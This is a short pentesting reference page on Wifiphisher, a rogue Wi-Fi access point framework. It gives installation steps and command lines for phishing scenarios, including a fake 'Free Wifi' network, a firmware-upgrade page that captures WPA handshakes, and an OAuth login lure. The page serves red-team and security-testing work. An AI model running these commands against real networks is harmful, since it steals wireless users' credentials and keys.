---
icon: wifi
---

# Wifi Phishing - Wifiphisher

## Wifiphisher

[Wifiphisher](https://wifiphisher.org) is a rogue Access Point framework for conducting red team engagements or Wi-Fi security testing. Using Wifiphisher, penetration testers can easily achieve a man-in-the-middle position against wireless clients by performing targeted Wi-Fi association attacks. Wifiphisher can be further used to mount victim-customized web phishing attacks against the connected clients in order to capture credentials (e.g. from third party login pages or WPA/WPA2 Pre-Shared Keys) or infect the victim stations with malwares.

## Installation

```
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies

OR

sudo apt install wifiphisher
```

## Usage

```
# Basic and Simple Command
sudo wifiphisher -e "Free Wifi"

# Firmware Upgrade Scenario
wifiphisher -aI wlan0 -jI wlan4 -p firmware-upgrade --handshake-capture handshake.pcap

# Plugin Update Scenario
wifiphisher --essid CONFERENCE_WIFI -p plugin_update -pK s3cr3tp4ssw0rd

# O-Auth Login Scenario
wifiphisher --essid "FREE WI-FI" -p oauth-login -kB
```





## REFERENCES

* [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)
* [https://www.youtube.com/watch?v=FVBti1vhJVA\&ab\_channel=BSidesPrishtina](https://www.youtube.com/watch?v=FVBti1vhJVA\&ab\_channel=BSidesPrishtina)
